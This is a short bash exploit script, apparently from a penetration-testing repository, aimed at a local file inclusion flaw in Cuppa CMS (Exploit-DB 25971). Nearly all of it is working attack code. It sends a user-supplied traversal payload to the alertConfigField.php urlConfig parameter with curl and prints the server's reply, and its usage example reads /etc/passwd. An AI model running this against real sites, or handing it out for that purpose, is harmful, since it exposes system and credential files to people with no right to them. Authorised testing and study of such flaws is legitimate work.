#!/bin/bash

#############################################################################
#   Repositorio:    Pentest Scrpts - CVEs                                   #
#   Nome:           Exploit Cuppa CMS 25971                                 #
#   Descrição:      Exploit para LFI                                        #
#   Autor:          Carine Constantino                                      #
#   Versão:         1.0                                                     #
#   Data:           23/04/2020                                              #                                      
#   Função:         Script para explorar a vulnerabilidade                  #  
#                   LFI - Local File Inclusion na aplicação                 #
#                   Cuppa CMS.                                              #
#   Exploit-DB: Exploit-DB: https://www.exploit-db.com/exploits/25971\n     #
#                                                                           #
#############################################################################

if [ "$1" == "" ]
then
	green="\e[32m"
	normal="\e[0m"
	echo "Cuppa CMS"
	echo "Exploit - Local File Inclusion"
	echo "Exploit-DB: https://www.exploit-db.com/exploits/25971\n"
	echo "Informe a URL e o Payload"
	echo "Exemplo: $0 http://exemplo.com/alerts/alertConfigField.php? ../../../../../../../../../etc/passwd"
else
	
	green="\e[32m"
	normal="\e[0m"
	rm result.txt
	echo -e "${green}ATTACKING....!!! LOCAL FILE INCLUSION, ${normal}"
	echo -e "${green}URL: $1, ${normal}"
	echo -e "${green}PAYLOAD: $2, ${normal}\n"
	curl -X GET "$1/alerts/alertConfigField.php?urlConfig=$2" -s -o result.txt 
	echo -e "${green}RESULT:, ${normal}"
	echo $(cat result.txt)

fi
